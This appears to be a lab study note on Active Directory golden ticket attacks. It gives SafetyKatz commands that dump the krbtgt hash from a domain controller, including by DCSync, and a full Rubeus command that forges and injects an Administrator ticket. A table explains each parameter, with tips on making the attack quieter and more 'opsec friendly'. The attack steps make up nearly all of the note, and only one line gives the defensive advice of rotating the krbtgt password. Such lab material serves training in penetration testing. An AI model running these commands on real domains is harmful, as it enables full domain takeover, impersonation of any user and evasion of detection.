# Golden Ticket

* A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
* The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
* As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.

* Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
```
C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'
```

*  To use the DCSync feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object):
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

⚠️ Using the DCSync option needs no code execution on the target DC 
## Golden Ticket - Rubeus

* Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
```
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

*  Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:
1. To retrieve flags for user specified in /user.
2. To retrieve /groups, /pgid, /minpassage and /maxpassage
3. To retrieve /netbios of the current domain
* If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly).

* The Golden ticket forging command looks like this:
```
C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
/ptt
```

| golden                                                                       | Name of the module                                                                      |
| ---------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| /aes256:154CB6624B1D859F7080A6615ADC488F09F<br>92843879B3D914CBCB5A8C3CDA848 | AES256 keys of the krbtgt account. Using AES keys makes the<br>attack more silent.      |
| /user:Administrator                                                          | Username for which the TGT is generated                                                 |
| /id:500                                                                      | User RID (retrieved from the DC) (Default 500)                                          |
| /pgid:513                                                                    | Primary Group ID (retrieved from the DC) (Default 513)                                  |
| /groups:544,512,520,513                                                      | Groups the user is a member of (retrieved from the DC)<br>(Default 520,512,513,519,518) |
| /domain:dollarcorp.moneycorp.local                                           | FQDN of the domain (retrieved from the DC)                                              |
| /sid:S-1-5-21-719815819-3726368948-3917688648                                | SID of the current domain                                                               |
| /pwdlastset:"11/11/2022 6:33:55 AM"                                          | The PasswordLastSet for the user (retrieved from the DC)                                |
| /minpassage:1                                                                | “Minimum Password Age” in days (retrieved from the DC)                                  |
| /logoncount:2453                                                             | Logon Count for the user (retrieved from the DC)                                        |
| /netbios:dcorp                                                               | NetBIOS name of the domain (retrieved from the DC)                                      |
| /dc:DCORP-DC.dollarcorp.moneycorp.local                                      | FQDN of the DC (retrieved from the DC)                                                  |
| /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD                                     | UserAccountControl Flags (retrieved from the DC)                                        |
| /ptt                                                                         | Inject in the current process                                                           |


